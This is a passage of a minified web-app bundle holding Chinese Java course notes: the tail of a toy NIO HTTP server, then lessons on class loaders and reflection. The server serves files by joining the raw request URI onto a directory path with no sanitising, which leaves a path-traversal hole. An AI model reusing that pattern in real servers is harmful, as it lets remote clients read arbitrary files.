selectionKey.channel();\n\n              StringBuilder sb = new StringBuilder();\n              //创建一个缓冲区\n              ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n              int len;\n              //循环读取\n              while((len = socketChannel.read(byteBuffer)) > 0){\n                  byteBuffer.flip();\n                  sb.append(new String(byteBuffer.array(),0,len));\n                  //System.out.println(new String(byteBuffer.array(),0,len));\n                  byteBuffer.clear();\n              }\n              //System.out.println(sb);\n              parseHttpRequest(sb);\n\n          } catch (IOException e) {\n              e.printStackTrace();\n          }\n      }\n    \n      //解析http请求协议中的数据\n      private void parseHttpRequest(StringBuilder sb) {\n          //1.需要把StringBuilder先变成一个字符串\n          String httpRequestStr = sb.toString();\n          if(!(httpRequestStr == null || "".equals(httpRequestStr))){\n              //2.获取每一行数据\n              String[] split = httpRequestStr.split("\\r\\n");\n              //3.获取请求行\n              String httpRequestLine = split[0];//GET / HTTP/1.1\n              //4.按照空格进行切割,得到请求行中的三部分\n              String[] httpRequestInfo = httpRequestLine.split(" ");\n              this.method = httpRequestInfo[0];\n              this.requestURI = httpRequestInfo[1];\n              this.version = httpRequestInfo[2];\n              //5.操作每一个请求头\n              for (int i = 1; i < split.length; i++) {\n                  String httpRequestHeaderInfo = split[i];//Host: 127.0.0.1:10000\n                  String[] httpRequestHeaderInfoArr = httpRequestHeaderInfo.split(": ");\n                  hm.put(httpRequestHeaderInfoArr[0],httpRequestHeaderInfoArr[1]);\n              }\n          }\n      }\n\n      public String getMethod() {\n          return method;\n      }\n\n      public void setMethod(String method) {\n          this.method = method;\n      }\n\n      public String getRequestURI() {\n          return requestURI;\n      }\n\n      public void setRequestURI(String requestURI) {\n          this.requestURI = requestURI;\n      }\n\n      public String getVersion() {\n          return version;\n      }\n\n      public void setVersion(String version) {\n          this.version = version;\n      }\n\n      public HashMap<String, String> getHm() {\n          return hm;\n      }\n\n      public void setHm(HashMap<String, String> hm) {\n          this.hm = hm;\n      }\n\n      @Override\n      public String toString() {\n          return "HttpRequest{" +\n                  "method=\'" + method + \'\\\'\' +\n                  ", requestURI=\'" + requestURI + \'\\\'\' +\n                  ", version=\'" + version + \'\\\'\' +\n                  ", hm=" + hm +\n                  \'}\';\n      }\n  }\n  /**\n   * 用来封装响应数据的类\n   */\n  public class HttpResponse {\n      private String version; //协议版本\n      private String status;  //响应状态码\n      private String desc;    //状态码的描述信息\n\n      //响应头数据\n      private HashMap<String, String> hm = new HashMap<>();\n\n      private HttpRequest httpRequest;  //我们后面要根据请求的数据,来进行一些判断\n\n      //给浏览器响应数据的方法\n      public void sendStaticResource(SelectionKey selectionKey) {\n          //1.给响应行赋值\n          this.version = "HTTP/1.1";\n          this.status = "200";\n          this.desc = "ok";\n\n          //3.给响应头赋值\n          //先获取浏览器请求的URI\n          String requestURI = this.getHttpRequest().getRequestURI();\n          if(requestURI != null){\n\n              File file = new File(WEB_APP_PATH + requestURI);\n              //判断这个路径是否存在\n              if(!file.exists()){\n                  this.status = "404";\n                  this.desc = "NOT FOUNG";\n              }\n\n              if("200".equals(this.status)){\n                  if("/".equals(requestURI)){\n                      hm.put("Content-Type", "text/html;charset=UTF-8");\n                  }else if("/favicon.ico".equals(requestURI)){\n                      hm.put("Content-Type", "image/x-icon");\n                  }else if("/a.txt".equals(requestURI)){\n                      hm.put("Content-Type", "text/html;charset=UTF-8");\n                  }else if("/1.jpg".equals(requestURI)){\n                      hm.put("Content-Type", "image/jpeg");\n                  }else if("/1.png".equals(requestURI)){\n                      hm.put("Content-Type", "image/png");\n                  }\n              }else{\n                  hm.put("Content-Type", "text/html;charset=UTF-8");\n              }\n\n          }\n\n          //2.将响应行拼接成一个单独的字符串 // HTTP/1.1 200 ok\n          String responseLine = this.version + " " + this.status + " " + this.desc + "\\r\\n";\n\n          //4.将所有的响应头拼接成一个单独的字符串\n          StringBuilder sb = new StringBuilder();\n          Set<Map.Entry<String, String>> entries = hm.entrySet();\n          for (Map.Entry<String, String> entry : entries) {\n              sb.append(entry.getKey()).append(": ").append(entry.getValue()).append("\\r\\n");\n          }\n\n          //5.响应空行\n          String emptyLine = "\\r\\n";\n\n          //6.响应行,响应头,响应空行拼接成一个大字符串\n          String responseLineStr = responseLine + sb.toString() + emptyLine;\n\n          try {\n              //7.将上面三个写给浏览器\n              SocketChannel socketChannel = (SocketChannel) selectionKey.channel();\n              ByteBuffer byteBuffer1 = ByteBuffer.wrap(responseLineStr.getBytes());\n              socketChannel.write(byteBuffer1);\n\n              //8.单独操作响应体\n              //因为在以后响应体不一定是一个字符串\n              //有可能是一个文件,所以单独操作\n             // String s = "哎哟,妈呀,终于写完了.";\n              byte [] bytes = getContent();\n              ByteBuffer byteBuffer2 = ByteBuffer.wrap(bytes);\n              socketChannel.write(byteBuffer2);\n\n              //9.释放资源\n              socketChannel.close();\n          } catch (IOException e) {\n              e.printStackTrace();\n          }\n      }\n\n      public static final String WEB_APP_PATH = "mynio\\\\webapp";\n      private byte[] getContent() {\n          try {\n              //1.获取浏览器请求的URI\n              String requestURI = this.getHttpRequest().getRequestURI();\n              if(requestURI != null){\n\n                  if("200".equals(this.status)){\n                      //2.判断一下请求的URI,根据不同的URI来响应不同的东西\n                      if("/".equals(requestURI)){\n                          String s = "哎哟,妈呀,终于写完了.";\n                          return s.getBytes();\n                      }else/* if("/favicon.ico".equals(requestURI))*/{\n                          //获取一个ico文件\n                          FileInputStream fis = new FileInputStream(WEB_APP_PATH + requestURI);\n                          //把ico文件变成一个字节数组返回\n                          return IOUtils.toByteArray(fis);\n                      }\n                  }else{\n                      return "访问的资源不存在".getBytes();\n                  }\n              }\n          } catch (IOException e) {\n              e.printStackTrace();\n          }\n          return new byte[0];\n      }\n\n      public String getVersion() {\n          return version;\n      }\n\n      public void setVersion(String version) {\n          this.version = version;\n      }\n\n      public String getStatus() {\n          return status;\n      }\n\n      public void setStatus(String status) {\n          this.status = status;\n      }\n\n      public String getDesc() {\n          return desc;\n      }\n\n      public void setDesc(String desc) {\n          this.desc = desc;\n      }\n\n      public HashMap<String, String> getHm() {\n          return hm;\n      }\n\n      public void setHm(HashMap<String, String> hm) {\n          this.hm = hm;\n      }\n\n      public HttpRequest getHttpRequest() {\n          return httpRequest;\n      }\n\n      public void setHttpRequest(HttpRequest httpRequest) {\n          this.httpRequest = httpRequest;\n      }\n\n      @Override\n      public String toString() {\n          return "HttpResponse{" +\n                  "version=\'" + version + \'\\\'\' +\n                  ", status=\'" + status + \'\\\'\' +\n                  ", desc=\'" + desc + \'\\\'\' +\n                  ", hm=" + hm +\n                  ", httpRequest=" + httpRequest +\n                  \'}\';\n      }\n  }\n  ```\n\n  ​\n\n',Gn={data:function(){return{MainComponent1:Wn,MainComponent2:$n}}},Vn=Gn,Qn=Object(u["a"])(Vn,Jn,zn,!1,null,"b2c30d14",null),Kn=Qn.exports,Xn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent1}}),t("q-markdown",{attrs:{src:n.MainComponent2}}),t("q-markdown",{attrs:{src:n.MainComponent3}})],1)},Yn=[],Zn='## 1.类加载器\r\n\r\n### 1.1类加载器【理解】\r\n\r\n+ 作用\r\n\r\n  负责将.class文件（存储的物理文件）加载在到内存中\r\n\r\n  ![01_类加载器](./img/java/basics/day25-基础加强01.img/01_类加载器.png)\r\n\r\n### 1.2类加载的过程【理解】\r\n\r\n+ 类加载时机\r\n\r\n  + 创建类的实例（对象）\r\n  + 调用类的类方法\r\n  + 访问类或者接口的类变量，或者为该类变量赋值\r\n  + 使用反射方式来强制创建某个类或接口对应的java.lang.Class对象\r\n  + 初始化某个类的子类\r\n  + 直接使用java.exe命令来运行某个主类\r\n\r\n+ 类加载过程\r\n\r\n  1. 加载\r\n\r\n     + 通过包名 + 类名，获取这个类，准备用流进行传输\r\n     + 在这个类加载到内存中\r\n     + 加载完毕创建一个class对象\r\n\r\n     ![02_类加载过程加载](./img/java/basics/day25-基础加强01.img/02_类加载过程加载.png)\r\n\r\n  2. 链接\r\n\r\n     + 验证\r\n\r\n       确保Class文件字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身安全\r\n\r\n       (文件中的信息是否符合虚拟机规范有没有安全隐患)\r\n\r\n     ![03_类加载过程验证](./img/java/basics/day25-基础加强01.img/03_类加载过程验证.png)\r\n\r\n     + 准备\r\n\r\n       负责为类的类变量（被static修饰的变量）分配内存，并设置默认初始化值\r\n\r\n       (初始化静态变量)\r\n\r\n     ![04_类加载过程准备](./img/java/basics/day25-基础加强01.img/04_类加载过程准备.png)\r\n\r\n     + 解析\r\n\r\n       将类的二进制数据流中的符号引用替换为直接引用\r\n\r\n       (本类中如果用到了其他类，此时就需要找到对应的类)\r\n\r\n     ![05_类加载过程解析](./img/java/basics/day25-基础加强01.img/05_类加载过程解析.png)\r\n\r\n  3. 初始化\r\n\r\n     根据程序员通过程序制定的主观计划去初始化类变量和其他资源\r\n\r\n     (静态变量赋值以及初始化其他资源)\r\n\r\n     ![06_类加载过程初始化](./img/java/basics/day25-基础加强01.img/06_类加载过程初始化.png)\r\n\r\n+ 小结\r\n\r\n  + 当一个类被使用的时候，才会加载到内存\r\n  + 类加载的过程: 加载、验证、准备、解析、初始化\r\n\r\n### 1.3类加载的分类【理解】\r\n\r\n+ 分类\r\n  + Bootstrap class loader：虚拟机的内置类加载器，通常表示为null ，并且没有父null\r\n  + Platform class loader：平台类加载器,负责加载JDK中一些特殊的模块\r\n  + System class loader：系统类加载器,负责加载用户类路径上所指定的类库\r\n\r\n+ 类加载器的继承关系\r\n\r\n  + System的父加载器为Platform\r\n  + Platform的父加载器为Bootstrap\r\n\r\n+ 代码演示\r\n\r\n  ```java\r\n  public class ClassLoaderDemo1 {\r\n      public static void main(String[] args) {\r\n          //获取系统类加载器\r\n          ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();\r\n\r\n          //获取系统类加载器的父加载器 --- 平台类加载器\r\n          ClassLoader classLoader1 = systemClassLoader.getParent();\r\n\r\n          //获取平台类加载器的父加载器 --- 启动类加载器\r\n          ClassLoader classLoader2 = classLoader1.getParent();\r\n\r\n          System.out.println("系统类加载器" + systemClassLoader);\r\n          System.out.println("平台类加载器" + classLoader1);\r\n          System.out.println("启动类加载器" + classLoader2);\r\n\r\n      }\r\n  }\r\n  ```\r\n\r\n### 1.4双亲委派模型【理解】\r\n\r\n+ 介绍\r\n\r\n  如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器，如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成此加载任务，子加载器才会尝试自己去加载，这就是双亲委派模式\r\n\r\n  ![07_双亲委派模型](./img/java/basics/day25-基础加强01.img/07_双亲委派模型.png)\r\n\r\n\r\n### 1.5ClassLoader 中的两个方法【应用】\r\n\r\n- 方法介绍\r\n\r\n  | 方法名                                      | 说明        |\r\n  | ---------------------------------------- | --------- |\r\n  | public static ClassLoader getSystemClassLoader() | 获取系统类加载器  |\r\n  | public InputStream getResourceAsStream(String name) | 加载某一个资源文件 |\r\n\r\n- 示例代码\r\n\r\n  ```java\r\n  public class ClassLoaderDemo2 {\r\n      public static void main(String[] args) throws IOException {\r\n          //static ClassLoader getSystemClassLoader() 获取系统类加载器\r\n          //InputStream getResourceAsStream(String name)  加载某一个资源文件\r\n\r\n          //获取系统类加载器\r\n          ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();\r\n\r\n          //利用加载器去加载一个指定的文件\r\n          //参数：文件的路径（放在src的根目录下，默认去那里加载）\r\n          //返回值：字节流。\r\n          InputStream is = systemClassLoader.getResourceAsStream("prop.properties");\r\n\r\n          Properties prop = new Properties();\r\n          prop.load(is);\r\n\r\n          System.out.println(prop);\r\n\r\n          is.close();\r\n      }\r\n  }\r\n  ```\r\n\r\n## 2.反射\r\n\r\n### 2.1反射的概述【理解】\r\n\r\n+ 反射机制\r\n\r\n  是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；\r\n  对于任意一个对象，都能够调用它的任意属性和方法；\r\n  这种动态获取信息以及动态调用对象方法的功能称为Java语言的反射机制。\r\n\r\n### 2.2获取Class类对象的三种方式【应用】\r\n\r\n+ 三种方式分类\r\n  + 类名.class属性\r\n\r\n  + 对象名.getClass()方法\r\n\r\n  + Class.forName(全类名)方法\r\n\r\n    ​\r\n\r\n  ![08_获取Class对象的三种方式](./img/java/basics/day25-基础加强01.img/08_获取Class对象的三种方式.png)\r\n\r\n+ 示例代码\r\n\r\n  ```java\r\n  public class Student {\r\n      private String name;\r\n      private int age;\r\n\r\n      public Student() {\r\n      }\r\n\r\n      public Student(String name, int age) {\r\n          this.name = name;\r\n          this.age = age;\r\n      }\r\n\r\n      public String getName() {\r\n          return name;\r\n      }\r\n\r\n      public void setName(String name) {\r\n          this.name = name;\r\n      }\r\n\r\n      public int getAge() {\r\n          return age;\r\n      }\r\n\r\n      public void setAge(int age) {\r\n          this.age = age;\r\n      }\r\n\r\n      public void study(){\r\n          System.out.println("学生在学习");\r\n      }\r\n\r\n      @Override\r\n      public String toString() {\r\n          return "Student{" +\r\n                  "name=\'" + name + \'\\\'\' +\r\n                  ", age=" + age +\r\n                  \'}\';\r\n      }\r\n  }\r\n  public class ReflectDemo1 {\r\n      public static void main(String[] args) throws ClassNotFoundException {\r\n          //1.Class类中的静态方法forName("全类名")\r\n              //全类名:包名 + 类名\r\n          Class clazz = Class.forName("com.itheima.myreflect2.Student");\r\n          System.out.println(clazz);\r\n\r\n          //2.通过class属性来获取\r\n          Class clazz2 = Student.class;\r\n          System.out.println(clazz2);\r\n\r\n          //3.利用对象的getClass方法来获取class对象\r\n          //getClass方法是定义在Object类中.\r\n          Student s = new Student();\r\n          Class clazz3 = s.getClass();\r\n          System.out.println(clazz3);\r\n\r\n          System.out.println(clazz == clazz2);\r\n          System.out.println(clazz2 == clazz3);\r\n      }\r\n  }\r\n  ```\r\n\r\n### 2.3反射获取构造方法并使用【应用】\r\n\r\n#### 2.3.1Class类获取构造方法对象的方法\r\n\r\n- 方法介绍\r\n\r\n  | 方法名                                      | 说明              |\r\n  | ---------------------------------------- | --------------- |\r\n  | Constructor<?>[] getConstructors()       | 返回所有公共构造方法对象的数组 |\r\n  | Constructor<?>[] getDeclaredConstructors() | 返回所有构造方法对象的数组   |\r\n  | Constructor<T> getConstructor(Class<?>... parameterTypes) | 返回单个公共构造方法对象    |\r\n  | Constructor<T> getDeclaredConstructor(Class<?>... parameterTypes) | 返回单个构造方法对象      |\r\n\r\n- 示例代码\r\n\r\n  ```java\r\n  public class Student {\r\n      private String name;\r\n      private int age;\r\n\r\n      //私有的有参构造方法\r\n      private Student(String name) {\r\n          System.out.println("name的值为:" + name);\r\n          System.out.println("private...Student...有参构造方法");\r\n      }\r\n\r\n      //公共的无参构造方法\r\n      public Student() {\r\n          System.out.println("public...Student...无参构造方法");\r\n      }\r\n\r\n      //公共的有参构造方法\r\n      public Student(String name, int age) {\r\n          System.out.println("name的值为:" + name + "age的值为:" + age);\r\n          System.out.println("public...Student...有参构造方法");\r\n      }\r\n  }\r\n  public class ReflectDemo1 {\r\n      public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException {\r\n          //method1();\r\n          //method2();\r\n          //method3();\r\n          //method4();\r\n      }\r\n\r\n      private static void method4() throws ClassNotFoundException, NoSuchMethodException {\r\n          //        Constructor<T> getDeclaredConstructor(Class<?>... parameterTypes)：\r\n  //                                      返回单个构造方法对象\r\n          //1.获取Class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect3.Student");\r\n          Constructor constructor = clazz.getDeclaredConstructor(String.class);\r\n          System.out.println(constructor);\r\n      }\r\n\r\n      private static void method3() throws ClassNotFoundException, NoSuchMethodException {\r\n          //        Constructor<T> getConstructor(Class<?>... parameterTypes)：\r\n  //                                      返回单个公共构造方法对象\r\n          //1.获取Class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect3.Student");\r\n          //小括号中,一定要跟构造方法的形参保持一致.\r\n          Constructor constructor1 = clazz.getConstructor();\r\n          System.out.println(constructor1);\r\n\r\n          Constructor constructor2 = clazz.getConstructor(String.class, int.class);\r\n          System.out.println(constructor2);\r\n\r\n          //因为Student类中,没有只有一个int的构造,所以这里会报错.\r\n          Constructor constructor3 = clazz.getConstructor(int.class);\r\n          System.out.println(constructor3);\r\n      }\r\n\r\n      private static void method2() throws ClassNotFoundException {\r\n          //        Constructor<?>[] getDeclaredConstructors()：\r\n  //                                      返回所有构造方法对象的数组\r\n          //1.获取Class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect3.Student");\r\n\r\n          Constructor[] constructors = clazz.getDeclaredConstructors();\r\n          for (Constructor constructor : constructors) {\r\n              System.out.println(constructor);\r\n          }\r\n      }\r\n\r\n      private static void method1() throws ClassNotFoundException {\r\n          //        Constructor<?>[] getConstructors()：\r\n  //                                      返回所有公共构造方法对象的数组\r\n          //1.获取Class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect3.Student");\r\n          Constructor[] constructors = clazz.getConstructors();\r\n          for (Constructor constructor : constructors) {\r\n              System.out.println(constructor);\r\n          }\r\n      }\r\n  }\r\n  ```\r\n\r\n#### 2.3.2Constructor类用于创建对象的方法\r\n\r\n+ 方法介绍\r\n\r\n  | 方法名                              | 说明               |\r\n  | -------------------------------- | ---------------- |\r\n  | T newInstance(Object...initargs) | 根据指定的构造方法创建对象    |\r\n  | setAccessible(boolean flag)      | 设置为true,表示取消访问检查 |\r\n\r\n+ 示例代码\r\n\r\n  ```java\r\n  // Student类同上一个示例,这里就不在重复提供了\r\n  public class ReflectDemo2 {\r\n      public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {\r\n          //T newInstance(Object... initargs)：根据指定的构造方法创建对象\r\n          //method1();\r\n          //method2();\r\n          //method3();\r\n          //method4();\r\n\r\n      }\r\n\r\n      private static void method4() throws ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {\r\n          //获取一个私有的构造方法并创建对象\r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect3.Student");\r\n\r\n          //2.获取一个私有化的构造方法.\r\n          Constructor constructor = clazz.getDeclaredConstructor(String.class);\r\n\r\n          //被private修饰的成员,不能直接使用的\r\n          //如果用反射强行获取并使用,需要临时取消访问检查\r\n          constructor.setAccessible(true);\r\n\r\n          //3.直接创建对象\r\n          Student student = (Student) constructor.newInstance("zhangsan");\r\n\r\n          System.out.println(student);\r\n      }\r\n\r\n      private static void method3() throws ClassNotFoundException, InstantiationException, IllegalAccessException {\r\n          //简写格式\r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect3.Student");\r\n\r\n          //2.在Class类中,有一个newInstance方法,可以利用空参直接创建一个对象\r\n          Student student = (Student) clazz.newInstance();//这个方法现在已经过时了,了解一下\r\n\r\n          System.out.println(student);\r\n      }\r\n\r\n      private static void method2() throws ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {\r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect3.Student");\r\n\r\n          //2.获取构造方法对象\r\n          Constructor constructor = clazz.getConstructor();\r\n\r\n          //3.利用空参来创建Student的对象\r\n          Student student = (Student) constructor.newInstance();\r\n\r\n          System.out.println(student);\r\n      }\r\n\r\n      private static void method1() throws ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {\r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect3.Student");\r\n\r\n          //2.获取构造方法对象\r\n          Constructor constructor = clazz.getConstructor(String.class, int.class);\r\n\r\n          //3.利用newInstance创建Student的对象\r\n          Student student = (Student) constructor.newInstance("zhangsan", 23);\r\n\r\n          System.out.println(student);\r\n      }\r\n  }\r\n  ```\r\n\r\n#### 2.3.3小结\r\n\r\n+ 获取class对象\r\n\r\n  三种方式: Class.forName(“全类名”), 类名.class, 对象名.getClass()\r\n\r\n+ 获取里面的构造方法对象\r\n\r\n  getConstructor (Class<?>... parameterTypes)\r\n  getDeclaredConstructor (Class<?>... parameterTypes)\r\n\r\n+ 如果是public的，直接创建对象\r\n\r\n  newInstance(Object... initargs)\r\n\r\n+ 如果是非public的，需要临时取消检查，然后再创建对象\r\n\r\n  setAccessible(boolean)  暴力反射\r\n\r\n### 2.4反射获取成员变量并使用【应用】\r\n\r\n#### 2.4.1Class类获取成员变量对象的方法\r\n\r\n- 方法分类\r\n\r\n  | 方法名                                 | 说明              |\r\n  | ----------------------------------- | --------------- |\r\n  | Field[] getFields()                 | 返回所有公共成员变量对象的数组 |\r\n  | Field[] getDeclaredFields()         | 返回所有成员变量对象的数组   |\r\n  | Field getField(String name)         | 返回单个公共成员变量对象    |\r\n  | Field getDeclaredField(String name) | 返回单个成员变量对象      |\r\n\r\n- 示例代码\r\n\r\n  ```java\r\n  public class Student {\r\n\r\n      public String name;\r\n\r\n      public int age;\r\n\r\n      public String gender;\r\n\r\n      private int money = 300;\r\n\r\n      @Override\r\n      public String toString() {\r\n          return "Student{" +\r\n                  "name=\'" + name + \'\\\'\' +\r\n                  ", age=" + age +\r\n                  ", gender=\'" + gender + \'\\\'\' +\r\n                  ", money=" + money +\r\n                  \'}\';\r\n      }\r\n  }\r\n  public class ReflectDemo1 {\r\n      public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException {\r\n         // method1();\r\n          //method2();\r\n          //method3();\r\n          //method4();\r\n\r\n      }\r\n\r\n      private static void method4() throws ClassNotFoundException, NoSuchFieldException {\r\n          //        Field getDeclaredField(String name)：返回单个成员变量对象\r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect4.Student");\r\n    \r\n          //2.获取money成员变量\r\n          Field field = clazz.getDeclaredField("money");\r\n    \r\n          //3.打印一下\r\n          System.out.println(field);\r\n      }\r\n    \r\n      private static void method3() throws ClassNotFoundException, NoSuchFieldException {\r\n          //        Field getField(String name)：返回单个公共成员变量对象\r\n          //想要获取的成员变量必须是真实存在的\r\n          //且必须是public修饰的.\r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect4.Student");\r\n    \r\n          //2.获取name这个成员变量\r\n          //Field field = clazz.getField("name");\r\n          //Field field = clazz.getField("name1");\r\n          Field field = clazz.getField("money");\r\n    \r\n          //3.打印一下\r\n          System.out.println(field);\r\n      }\r\n    \r\n      private static void method2() throws ClassNotFoundException {\r\n          //        Field[] getDeclaredFields()：返回所有成员变量对象的数组\r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect4.Student");\r\n    \r\n          //2.获取所有的Field对象\r\n          Field[] fields = clazz.getDeclaredFields();\r\n    \r\n          //3.遍历\r\n          for (Field field : fields) {\r\n              System.out.println(field);\r\n          }\r\n      }\r\n    \r\n      private static void method1() throws ClassNotFoundException {\r\n          //        Field[] getFields()：返回所有公共成员变量对象的数组\r\n    \r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect4.Student");\r\n    \r\n          //2.获取Field对象.\r\n          Field[] fields = clazz.getFields();\r\n    \r\n          //3.遍历\r\n          for (Field field : fields) {\r\n              System.out.println(field);\r\n          }\r\n      }\r\n  }\r\n  ```\r\n\r\n#### 2.4.2Field类用于给成员变量赋值的方法\r\n\r\n+ 方法介绍\r\n\r\n  | 方法名                                | 说明   |\r\n  | ---------------------------------- | ---- |\r\n  | void set(Object obj, Object value) | 赋值   |\r\n  | Object get(Object obj)             | 获取值  |\r\n\r\n+ 示例代码\r\n\r\n  ```java\r\n  // Student类同上一个示例,这里就不在重复提供了\r\n  public class ReflectDemo2 {\r\n      public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InstantiationException {\r\n  //        Object get(Object obj) 返回由该 Field表示的字段在指定对象上的值。\r\n          //method1();\r\n          //method2();\r\n\r\n      }\r\n\r\n      private static void method2() throws ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException {\r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect4.Student");\r\n\r\n          //2.获取成员变量Field的对象\r\n          Field field = clazz.getDeclaredField("money");\r\n\r\n          //3.取消一下访问检查\r\n          field.setAccessible(true);\r\n\r\n          //4.调用get方法来获取值\r\n          //4.1创建一个对象\r\n          Student student = (Student) clazz.newInstance();\r\n          //4.2获取指定对象的money的值\r\n          Object o = field.get(student);\r\n\r\n          //5.打印一下\r\n          System.out.println(o);\r\n      }\r\n\r\n      private static void method1() throws ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException {\r\n          //        void set(Object obj, Object value)：给obj对象的成员变量赋值为value\r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect4.Student");\r\n\r\n          //2.获取name这个Field对象\r\n          Field field = clazz.getField("name");\r\n\r\n          //3.利用set方法进行赋值.\r\n          //3.1先创建一个Student对象\r\n          Student student = (Student) clazz.newInstance();\r\n          //3.2有了对象才可以给指定对象进行赋值\r\n          field.set(student,"zhangsan");\r\n\r\n          System.out.println(student);\r\n      }\r\n  }\r\n  ```\r\n\r\n### 2.5反射获取成员方法并使用【应用】\r\n\r\n#### 2.5.1Class类获取成员方法对象的方法\r\n\r\n- 方法分类\r\n\r\n  | 方法名                                      | 说明                    |\r\n  | ---------------------------------------- | --------------------- |\r\n  | Method[] getMethods()                    | 返回所有公共成员方法对象的数组，包括继承的 |\r\n  | Method[] getDeclaredMethods()            | 返回所有成员方法对象的数组，不包括继承的  |\r\n  | Method getMethod(String name, Class<?>... parameterTypes) | 返回单个公共成员方法对象          |\r\n  | Method getDeclaredMethod(String name, Class<?>... parameterTypes) | 返回单个成员方法对象            |\r\n\r\n- 示例代码\r\n\r\n  ```java\r\n  public class Student {\r\n\r\n      //私有的，无参无返回值\r\n      private void show() {\r\n          System.out.println("私有的show方法，无参无返回值");\r\n      }\r\n\r\n      //公共的，无参无返回值\r\n      public void function1() {\r\n          System.out.println("function1方法，无参无返回值");\r\n      }\r\n\r\n      //公共的，有参无返回值\r\n      public void function2(String name) {\r\n          System.out.println("function2方法，有参无返回值,参数为" + name);\r\n      }\r\n\r\n      //公共的，无参有返回值\r\n      public String function3() {\r\n          System.out.println("function3方法，无参有返回值");\r\n          return "aaa";\r\n      }\r\n\r\n      //公共的，有参有返回值\r\n      public String function4(String name) {\r\n          System.out.println("function4方法，有参有返回值,参数为" + name);\r\n          return "aaa";\r\n      }\r\n  }\r\n  public class ReflectDemo1 {\r\n      public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException {\r\n          //method1();\r\n          //method2();\r\n          //method3();\r\n          //method4();\r\n          //method5();\r\n      }\r\n\r\n      private static void method5() throws ClassNotFoundException, NoSuchMethodException {\r\n          //        Method getDeclaredMethod(String name, Class<?>... parameterTypes)：\r\n  //                                返回单个成员方法对象\r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect5.Student");\r\n          //2.获取一个成员方法show\r\n          Method method = clazz.getDeclaredMethod("show");\r\n          //3.打印一下\r\n          System.out.println(method);\r\n      }\r\n    \r\n      private static void method4() throws ClassNotFoundException, NoSuchMethodException {\r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect5.Student");\r\n          //2.获取一个有形参的方法function2\r\n          Method method = clazz.getMethod("function2", String.class);\r\n          //3.打印一下\r\n          System.out.println(method);\r\n      }\r\n    \r\n      private static void method3() throws ClassNotFoundException, NoSuchMethodException {\r\n          //        Method getMethod(String name, Class<?>... parameterTypes) ：\r\n  //                                返回单个公共成员方法对象\r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect5.Student");\r\n          //2.获取成员方法function1\r\n          Method method1 = clazz.getMethod("function1");\r\n          //3.打印一下\r\n          System.out.println(method1);\r\n      }\r\n    \r\n      private static void method2() throws ClassNotFoundException {\r\n          //        Method[] getDeclaredMethods()：\r\n  //                                返回所有成员方法对象的数组，不包括继承的\r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect5.Student");\r\n    \r\n          //2.获取Method对象\r\n          Method[] methods = clazz.getDeclaredMethods();\r\n          //3.遍历一下数组\r\n          for (Method method : methods) {\r\n              System.out.println(method);\r\n          }\r\n      }\r\n    \r\n      private static void method1() throws ClassNotFoundException {\r\n          //        Method[] getMethods()：返回所有公共成员方法对象的数组，包括继承的\r\n          //1.获取class对象\r\n          Class clazz = Class.forName("com.itheima.myreflect5.Student");\r\n          //2.获取成员方法对象\r\n          Method[] methods = clazz.getMethods();\r\n          //3.遍历\r\n          for (Method method : methods) {\r\n              System.out.println(method);\r\n          }\r\n      }\r\n  }\r\n  ```\r\n\r\n#### 2.5.2Method类用于执行方法的方法\r\n\r\n+ 方法介绍\r\n\r\n  | 方法名                                      | 说明   |\r\n  | ---------------------------------------- | ---- |\r\n  | Object invoke(Object obj, Object... args) | 运行方法 |\r\n\r\n  参数一: 用obj对象调用该方法\r\n\r\n  参数二: 调用方法的传递的参数(如果没有就不写)\r\n\r\n  返回值: 方法的返回值(如果没有就不写)\r\n\r\n+ 示例代码\r\n\r\n  ```java\r\n  public class ReflectDemo2 {\r\n      public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException {\r\n  //        Object invoke(Object obj, Object... args)：运行方法\r\n  //        参数一：用obj对象调用该方法\r\n  //        参数二：调用方法的传递的参数（如果没有就不写）\r\n  //        返回值：方法的返回值（如果没有就不写）\r\n\r\n          //1.获取class对象\r\n          Class clazz = 